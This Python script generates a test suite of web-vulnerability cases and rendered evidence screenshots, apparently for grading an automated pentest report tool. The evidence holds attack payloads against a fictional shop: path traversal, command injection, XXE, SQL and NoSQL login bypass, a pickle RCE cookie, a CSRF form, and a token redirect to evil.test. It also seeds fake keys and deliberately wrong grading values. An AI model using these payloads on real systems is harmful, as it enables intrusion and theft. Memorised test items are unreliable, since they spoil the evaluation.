"""Generate full 30-case evaluation suite and rendered screenshot assets (with blurry and cropped variants)."""

from __future__ import annotations

import json
from pathlib import Path

from PIL import Image, ImageDraw, ImageFilter, ImageFont

from penmunshi.verify.cvss import score_vector
from penmunshi.verify.secrets import scan_text

CASES_DIR = Path("src/penmunshi/eval/cases")
ASSETS_DIR = CASES_DIR / "assets"
ASSETS_DIR.mkdir(parents=True, exist_ok=True)

FONTS = [
    "C:/Windows/Fonts/consola.ttf",
    "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
    "/System/Library/Fonts/Menlo.ttc",
]

def get_font(size: int = 20) -> ImageFont.FreeTypeFont | ImageFont.ImageFont:
    for path in FONTS:
        if Path(path).exists():
            return ImageFont.truetype(path, size)
    return ImageFont.load_default()

def render_screenshot(text: str, out_path: Path) -> None:
    f = get_font()
    lines = text.split("\n")
    width = max(int(f.getlength(line)) for line in lines) + 48
    height = 28 * len(lines) + 40
    img = Image.new("RGB", (max(width, 640), height), (15, 20, 26))
    draw = ImageDraw.Draw(img)
    for i, line in enumerate(lines):
        draw.text((24, 20 + 28 * i), line, font=f, fill=(222, 228, 234))
    
    # 1. Base clean image
    img.save(out_path, optimize=True)
    
    # 2. Blurry variant
    blurred = img.filter(ImageFilter.GaussianBlur(radius=2.5))
    blurred_path = out_path.with_name(f"{out_path.stem}-blur{out_path.suffix}")
    blurred.save(blurred_path, optimize=True)
    
    # 3. Cropped variant
    crop_w = int(img.width * 0.85)
    crop_h = int(img.height * 0.85)
    cropped = img.crop((0, 0, max(crop_w, 320), max(crop_h, 100)))
    cropped_path = out_path.with_name(f"{out_path.stem}-crop{out_path.suffix}")
    cropped.save(cropped_path, optimize=True)

# 10 cases with rendered screenshots
SCREENSHOT_CASES = {
    "path-traversal-downloads": {
        "filename": "path-traversal.png",
        "text": "GET /api/download?file=../../../../etc/passwd HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1001:1001:Shop Admin:/home/admin:/bin/bash"
    },
    "command-injection-ping": {
        "filename": "rce-ping.png",
        "text": "POST /api/tools/ping HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"host\":\"127.0.0.1; id; uname -a\"}\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux shop-prod 5.15.0-generic #1 SMP x86_64 GNU/Linux"
    },
    "hardcoded-secret-bundle": {
        "filename": "js-bundle-secrets.png",
        "text": "/* bundle.min.js excerpt */\nconst paymentConfig = {\n  provider: 'stripe',\n  apiKey: 'sk_test_51MzFakeKeyExample99Xz1234567890',\n  currency: 'usd'\n};\nconsole.log('Payment SDK loaded with key: ' + paymentConfig.apiKey);"
    },
    "open-redirect-oauth": {
        "filename": "open-redirect.png",
        "text": "GET /oauth/login?redirect_uri=https://evil.test/callback HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 302 Found\nLocation: https://evil.test/callback?auth_token=temp_token_xyz"
    },
    "xxe-xml-upload": {
        "filename": "xxe-injection.png",
        "text": "POST /api/import/invoice HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\"> ]>\n<invoice><id>&xxe;</id></invoice>\n\nHTTP/1.1 200 OK\n{\"error\":\"Invalid invoice ID: shop-ip-10-0-1-42\"}"
    },
    "graphql-introspection": {
        "filename": "graphql-intro.png",
        "text": "POST /graphql HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"query\":\"query { __schema { types { name } } }\"}\n\nHTTP/1.1 200 OK\n{\"data\":{\"__schema\":{\"types\":[{\"name\":\"User\"},{\"name\":\"CreditCard\"},{\"name\":\"AdminQuery\"}]}}}"
    },
    "info-disclosure-phpinfo": {
        "filename": "phpinfo.png",
        "text": "GET /test/phpinfo.php HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 200 OK\nPHP Version 8.2.14\nSystem => Linux acme-web-1 5.15.0-x86_64\nServer API => FPM/FastCGI\nLoaded Configuration File => /etc/php/8.2/fpm/php.ini"
    },
    "nosql-injection-auth": {
        "filename": "nosql-auth.png",
        "text": "POST /api/v1/auth/login HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}\n\nHTTP/1.1 200 OK\n{\"status\":\"success\",\"message\":\"Logged in as admin\",\"role\":\"administrator\"}"
    },
    "sqli-login-shot": {
        "filename": "sqli-login.png",
        "text": "POST /api/login HTTP/1.1\nHost: shop.acme.test\nusername=' OR 1=1--&password=foo\n\nHTTP/1.1 302 Found\nLocation: /admin/dashboard\nSet-Cookie: session=adm_session_token_xyz; Path=/"
    },
    "jwt-none-alg-shot": {
        "filename": "jwt-none.png",
        "text": "GET /api/me HTTP/1.1\nHost: shop.acme.test\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.\n\nHTTP/1.1 200 OK\n{\"user\":\"admin\",\"role\":\"admin\",\"access\":\"unrestricted\"}"
    }
}

# The 18 new case specifications
NEW_CASES = [
    # Dev cases (14 new)
    {
        "id": "path-traversal-downloads",
        "split": "dev",
        "title": "Path traversal in file download endpoint",
        "asset": "https://shop.acme.test/api/download",
        "notes": "Arbitrary file read via path traversal in GET /api/download?file=../../../../etc/passwd.\nAttacker can read system files (/etc/passwd, application configuration) without authentication.",
        "evidence": [
            {
                "name": "path-traversal.png",
                "file": "assets/path-traversal.png",
                "text": "GET /api/download?file=../../../../etc/passwd HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1001:1001:Shop Admin:/home/admin:/bin/bash"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": ["22"],
            "cves": [],
            "secrets": [],
            "score": 7.5,
            "severity": "High"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "command-injection-ping",
        "split": "dev",
        "title": "OS command injection in diagnostic ping tool",
        "asset": "https://shop.acme.test/api/tools/ping",
        "notes": "Command injection vulnerability in POST /api/tools/ping. Authenticated user can append shell operators like ; id to execute arbitrary commands as www-data on the web server.",
        "evidence": [
            {
                "name": "rce-ping.png",
                "file": "assets/rce-ping.png",
                "text": "POST /api/tools/ping HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"host\":\"127.0.0.1; id; uname -a\"}\n\nHTTP/1.1 200 OK\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux shop-prod 5.15.0-generic #1 SMP x86_64 GNU/Linux"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cwe": ["78"],
            "cves": [],
            "secrets": [],
            "score": 8.8,
            "severity": "High"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "hardcoded-secret-bundle",
        "split": "dev",
        "title": "Hardcoded Stripe secret key exposed in client bundle",
        "asset": "https://shop.acme.test/static/js/bundle.min.js",
        "notes": "Front-end JavaScript bundle exposes live Stripe secret API key sk_test_51MzFakeKeyExample99Xz1234567890 in plaintext, allowing unauthorized payment API abuse.",
        "evidence": [
            {
                "name": "js-bundle-secrets.png",
                "file": "assets/js-bundle-secrets.png",
                "text": "/* bundle.min.js excerpt */\nconst paymentConfig = {\n  provider: 'stripe',\n  apiKey: 'sk_test_51MzFakeKeyExample99Xz1234567890',\n  currency: 'usd'\n};\nconsole.log('Payment SDK loaded with key: ' + paymentConfig.apiKey);"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": ["798", "200"],
            "cves": [],
            "secrets": ["stripe_key"],
            "score": 7.5,
            "severity": "High"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True, "leak_secret": True},
        "seeded_secrets": ["sk_test_51MzFakeKeyExample99Xz1234567890"],
        "tool_output": ""
    },
    {
        "id": "open-redirect-oauth",
        "split": "dev",
        "title": "Unvalidated open redirect in OAuth login callback",
        "asset": "https://shop.acme.test/oauth/login",
        "notes": "Open redirect on GET /oauth/login?redirect_uri=https://evil.test/callback allows attackers to construct phishing links that redirect authentication tokens to third-party domains.",
        "evidence": [
            {
                "name": "open-redirect.png",
                "file": "assets/open-redirect.png",
                "text": "GET /oauth/login?redirect_uri=https://evil.test/callback HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 302 Found\nLocation: https://evil.test/callback?auth_token=temp_token_xyz"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cwe": ["601"],
            "cves": [],
            "secrets": [],
            "score": 6.1,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "Critical", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "csrf-account-email",
        "split": "dev",
        "title": "Cross-Site Request Forgery on email update endpoint",
        "asset": "https://shop.acme.test/api/user/email",
        "notes": "POST /api/user/email lacks CSRF protection or anti-CSRF token. An attacker can host a malicious webpage that forces authenticated victims to update their account email address.",
        "evidence": [
            {
                "name": "csrf-poc.html",
                "text": "<form action='https://shop.acme.test/api/user/email' method='POST'>\n  <input type='hidden' name='email' value='attacker@evil.test' />\n</form>\n<script>document.forms[0].submit();</script>"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
            "cwe": ["352"],
            "cves": [],
            "secrets": [],
            "score": 6.5,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "xxe-xml-upload",
        "split": "dev",
        "title": "XML External Entity (XXE) injection in invoice parser",
        "asset": "https://shop.acme.test/api/import/invoice",
        "notes": "XXE vulnerability in invoice XML processor at /api/import/invoice. External entity references are resolved, enabling arbitrary local file disclosure.",
        "evidence": [
            {
                "name": "xxe-injection.png",
                "file": "assets/xxe-injection.png",
                "text": "POST /api/import/invoice HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\"> ]>\n<invoice><id>&xxe;</id></invoice>\n\nHTTP/1.1 200 OK\n{\"error\":\"Invalid invoice ID: shop-ip-10-0-1-42\"}"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": ["611"],
            "cves": [],
            "secrets": [],
            "score": 7.5,
            "severity": "High"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "subdomain-takeover-cname",
        "split": "dev",
        "title": "Dangling CNAME record allows subdomain takeover",
        "asset": "blog.shop.acme.test",
        "notes": "Subdomain blog.shop.acme.test points to an unallocated AWS S3 bucket via CNAME. Anyone can register the bucket and host arbitrary content under the trusted domain.",
        "evidence": [
            {
                "name": "dns-query.txt",
                "text": "$ dig blog.shop.acme.test CNAME +short\nacme-blog-bucket.s3.amazonaws.com.\n$ curl -s https://blog.shop.acme.test\n<Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message></Error>"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "cwe": ["284"],
            "cves": [],
            "secrets": [],
            "score": 7.5,
            "severity": "High"
        },
        "faults": {"cwe": "99999", "severity_text": "Critical", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "graphql-introspection",
        "split": "dev",
        "title": "GraphQL schema introspection enabled in production",
        "asset": "https://shop.acme.test/graphql",
        "notes": "GraphQL introspection query is enabled in production on POST /graphql, disclosing the entire data model including private queries, admin types, and mutation signatures.",
        "evidence": [
            {
                "name": "graphql-intro.png",
                "file": "assets/graphql-intro.png",
                "text": "POST /graphql HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"query\":\"query { __schema { types { name } } }\"}\n\nHTTP/1.1 200 OK\n{\"data\":{\"__schema\":{\"types\":[{\"name\":\"User\"},{\"name\":\"CreditCard\"},{\"name\":\"AdminQuery\"}]}}}"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cwe": ["200"],
            "cves": [],
            "secrets": [],
            "score": 5.3,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "High", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "weak-password-policy",
        "split": "dev",
        "title": "Weak password policy allows trivial credentials",
        "asset": "https://shop.acme.test/register",
        "notes": "Registration endpoint allows 4-character passwords with no complexity requirements. Observed account created with password=1234, facilitating offline and credential stuffing attacks.",
        "evidence": [
            {
                "name": "register-req.txt",
                "text": "POST /register HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/x-www-form-urlencoded\n\nusername=testuser&password=1234\n\nHTTP/1.1 201 Created\nLocation: /dashboard"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            "cwe": ["521"],
            "cves": [],
            "secrets": [],
            "score": 6.5,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "High", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "info-disclosure-phpinfo",
        "split": "dev",
        "title": "PHP configuration file phpinfo.php left exposed",
        "asset": "https://shop.acme.test/test/phpinfo.php",
        "notes": "A test script /test/phpinfo.php exposes sensitive server environment details: PHP version 8.2.14, module paths, system architecture, and runtime settings.",
        "evidence": [
            {
                "name": "phpinfo.png",
                "file": "assets/phpinfo.png",
                "text": "GET /test/phpinfo.php HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 200 OK\nPHP Version 8.2.14\nSystem => Linux acme-web-1 5.15.0-x86_64\nServer API => FPM/FastCGI\nLoaded Configuration File => /etc/php/8.2/fpm/php.ini"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cwe": ["200"],
            "cves": [],
            "secrets": [],
            "score": 5.3,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "High", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "missing-hsts-header",
        "split": "dev",
        "title": "Missing Strict-Transport-Security (HSTS) header",
        "asset": "https://shop.acme.test",
        "notes": "The web server does not send a Strict-Transport-Security header on HTTPS responses, leaving users vulnerable to SSL stripping attacks on insecure networks.",
        "evidence": [
            {
                "name": "headers.txt",
                "text": "HTTP/1.1 200 OK\nServer: nginx/1.24.0\nContent-Type: text/html\nConnection: keep-alive"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N",
            "cwe": ["319"],
            "cves": [],
            "secrets": [],
            "score": 3.1,
            "severity": "Low"
        },
        "faults": {"cwe": "99999", "severity_text": "Critical", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "sensitive-cookie-no-httponly",
        "split": "dev",
        "title": "Session cookie missing HttpOnly and Secure flags",
        "asset": "https://shop.acme.test/login",
        "notes": "Session cookie session_id is issued without the HttpOnly or Secure flags in Set-Cookie, making it readable by JavaScript and vulnerable to theft via XSS.",
        "evidence": [
            {
                "name": "cookie-response.txt",
                "text": "HTTP/1.1 200 OK\nSet-Cookie: session_id=sess_9876543210abcdef; Path=/\nContent-Type: application/json"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
            "cwe": ["1004"],
            "cves": [],
            "secrets": [],
            "score": 4.3,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "High", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "insecure-deserialization",
        "split": "dev",
        "title": "Insecure Python pickle deserialization in session token",
        "asset": "https://shop.acme.test/api/state",
        "notes": "Session state parameter in Cookie: state= is passed directly to pickle.loads without verification, enabling remote code execution as web server user.",
        "evidence": [
            {
                "name": "rce-output.txt",
                "text": "GET /api/state HTTP/1.1\nHost: shop.acme.test\nCookie: state=gASVLgAAAAAAAACMCGJ1aWx0aW5zlIwGc3lzdGVtlJOUjAZpZCA+PiBvdXSUhZRSlC4=\n\nHTTP/1.1 200 OK\nuid=1000(appuser) gid=1000(appuser)"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": ["502"],
            "cves": [],
            "secrets": [],
            "score": 9.8,
            "severity": "Critical"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "bac-role-tampering",
        "split": "dev",
        "title": "Broken access control via role parameter tampering",
        "asset": "https://shop.acme.test/api/user/update",
        "notes": "Endpoint /api/user/update accepts a client-supplied role parameter. A regular user can escalate their privileges to role=admin by submitting role=admin in the JSON body.",
        "evidence": [
            {
                "name": "role-update.txt",
                "text": "PUT /api/user/update HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"email\":\"user@acme-shop.in\",\"role\":\"admin\"}\n\nHTTP/1.1 200 OK\n{\"status\":\"updated\",\"role\":\"admin\"}"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
            "cwe": ["269", "284"],
            "cves": [],
            "secrets": ["email"],
            "score": 8.8,
            "severity": "High"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True, "leak_secret": True},
        "seeded_secrets": ["user@acme-shop.in"],
        "tool_output": ""
    },

    # Heldout cases (4 new, bringing heldout to 8 total)
    {
        "id": "nosql-injection-auth",
        "split": "heldout",
        "title": "NoSQL injection bypass in MongoDB login endpoint",
        "asset": "https://shop.acme.test/api/v1/auth/login",
        "notes": "MongoDB query injection on POST /api/v1/auth/login allows authentication bypass using $ne operator in JSON parameters without valid password.",
        "evidence": [
            {
                "name": "nosql-auth.png",
                "file": "assets/nosql-auth.png",
                "text": "POST /api/v1/auth/login HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/json\n\n{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}\n\nHTTP/1.1 200 OK\n{\"status\":\"success\",\"message\":\"Logged in as admin\",\"role\":\"administrator\"}"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
            "cwe": ["943"],
            "cves": [],
            "secrets": [],
            "score": 9.1,
            "severity": "Critical"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "crlf-injection-headers",
        "split": "heldout",
        "title": "HTTP response splitting via CRLF injection in redirect",
        "asset": "https://shop.acme.test/redirect",
        "notes": "CRLF injection on GET /redirect?to=%0d%0aSet-Cookie:malicious=1 allows injecting arbitrary HTTP headers and writing responses (HTTP response splitting).",
        "evidence": [
            {
                "name": "crlf-resp.txt",
                "text": "GET /redirect?to=%0d%0aSet-Cookie:%20malicious=1 HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 302 Found\nLocation: \nSet-Cookie: malicious=1"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
            "cwe": ["113"],
            "cves": [],
            "secrets": [],
            "score": 6.1,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "Critical", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "race-condition-coupon",
        "split": "heldout",
        "title": "Race condition allows multiple redemptions of one-time coupon",
        "asset": "https://shop.acme.test/api/coupon/apply",
        "notes": "Race condition in coupon redemption endpoint. Concurrent HTTP requests with the same coupon code bypass the single-use check, applying the discount multiple times.",
        "evidence": [
            {
                "name": "race-log.txt",
                "text": "Thread 1: POST /api/coupon/apply code=SAVE50 -> 200 OK (discount applied)\nThread 2: POST /api/coupon/apply code=SAVE50 -> 200 OK (discount applied)\nFinal cart total: -50 USD"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
            "cwe": ["362"],
            "cves": [],
            "secrets": [],
            "score": 5.3,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "Low", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    },
    {
        "id": "clickjacking-iframe",
        "split": "heldout",
        "title": "Clickjacking vulnerability due to missing X-Frame-Options",
        "asset": "https://shop.acme.test/account/settings",
        "notes": "Sensitive settings page does not include X-Frame-Options or Content-Security-Policy frame-ancestors headers, allowing embedding in malicious frames for clickjacking.",
        "evidence": [
            {
                "name": "frame-headers.txt",
                "text": "HTTP/1.1 200 OK\nHost: shop.acme.test\nContent-Type: text/html\nServer: nginx/1.24.0"
            }
        ],
        "gold": {
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
            "cwe": ["1021"],
            "cves": [],
            "secrets": [],
            "score": 4.3,
            "severity": "Medium"
        },
        "faults": {"cwe": "99999", "severity_text": "High", "fake_claim": True},
        "seeded_secrets": [],
        "tool_output": ""
    }
]

def main() -> None:
    # 1. Render all screenshots (base, blur, crop)
    print("Rendering screenshot assets...")
    for spec in SCREENSHOT_CASES.values():
        out_file = ASSETS_DIR / spec["filename"]
        render_screenshot(spec["text"], out_file)
        print(f"  Rendered {out_file.name} (+ blur, crop)")

    # 2. Write new case JSON files
    print("\nWriting new case JSON files...")
    for case_data in NEW_CASES:
        # Validate vector and severity match
        score, sev = score_vector(case_data["gold"]["vector"])
        assert sev == case_data["gold"]["severity"], f"Severity mismatch in {case_data['id']}: {sev} vs {case_data['gold']['severity']}"
        assert abs(score - case_data["gold"]["score"]) < 0.15, f"Score mismatch in {case_data['id']}: {score} vs {case_data['gold']['score']}"
        
        # Validate seeded secrets
        full_text = "\n".join([case_data["notes"], *(e["text"] for e in case_data["evidence"])])
        found = {full_text[h.start : h.end] for h in scan_text(full_text)}
        for sec in case_data["seeded_secrets"]:
            assert sec in found, f"Seeded secret '{sec}' not detectable in {case_data['id']}"
            
        case_file = CASES_DIR / f"{case_data['id']}.json"
        case_file.write_text(json.dumps(case_data, indent=2), encoding="utf-8")
        print(f"  Wrote case {case_file.name} (split: {case_data['split']})")

    # 3. Also add screenshot files to existing cases if applicable
    sqli_case = CASES_DIR / "sqli-login.json"
    if sqli_case.exists():
        data = json.loads(sqli_case.read_text(encoding="utf-8"))
        if data["evidence"]:
            data["evidence"][0]["file"] = "assets/sqli-login.png"
            sqli_case.write_text(json.dumps(data, indent=2), encoding="utf-8")
            print("  Updated sqli-login.json with image file reference")

    jwt_case = CASES_DIR / "jwt-none-alg.json"
    if jwt_case.exists():
        data = json.loads(jwt_case.read_text(encoding="utf-8"))
        if data["evidence"]:
            data["evidence"][0]["file"] = "assets/jwt-none.png"
            jwt_case.write_text(json.dumps(data, indent=2), encoding="utf-8")
            print("  Updated jwt-none-alg.json with image file reference")

    total_cases = len(list(CASES_DIR.glob("*.json")))
    print(f"\nDone! Total cases in suite: {total_cases}")

if __name__ == "__main__":
    main()
